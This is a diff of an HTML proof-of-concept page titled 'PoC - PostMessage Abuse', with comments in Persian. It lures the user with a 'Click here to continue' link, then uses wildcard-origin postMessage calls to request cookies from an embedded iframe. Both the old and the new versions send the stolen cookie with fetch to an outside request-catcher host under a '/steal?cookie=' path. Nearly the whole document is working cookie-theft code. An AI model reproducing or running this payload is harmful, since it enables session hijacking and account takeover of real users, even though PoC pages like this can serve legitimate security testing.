@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>PoC - PostMessage Abuse</title>
 </head>
 <body>
     <a href="#" id="clickBtn">Click here to continue</a>
@@ -12,18 +12,26 @@
 
         btn.addEventListener('click', function (e) {
             e.preventDefault();
-            try {
-                const cookie = iframe.contentWindow.document.cookie;
-                if (cookie) {
-                    fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(cookie));
-                    alert('Done!');
-                } else {
-                    alert('No cookie found');
+
+            // ۱. به iframe پیام بفرست تا URL رو تغییر بده
+            iframe.contentWindow.postMessage({
+                type: 'IFRAME_URL_CHANGED',
+                url: 'https://www.google.com'
+            }, '*');
+
+            // ۲. از iframe درخواست کوکی کن
+            iframe.contentWindow.postMessage({
+                type: 'GET_COOKIE'
+            }, '*');
+
+            // ۳. گوش کن تا کوکی بیاد
+            window.addEventListener('message', function (e) {
+                if (e.data && e.data.type === 'COOKIE_RESPONSE') {
+                    console.log('Cookie received:', e.data.cookie);
+                    fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(e.data.cookie));
+                    alert('Cookie sent to listener!');
                 }
-            } catch (e) {
-                console.log('Error:', e.message);
-                alert('Error: ' + e.message);
-            }
+            });
         });
     </script>
 </body>
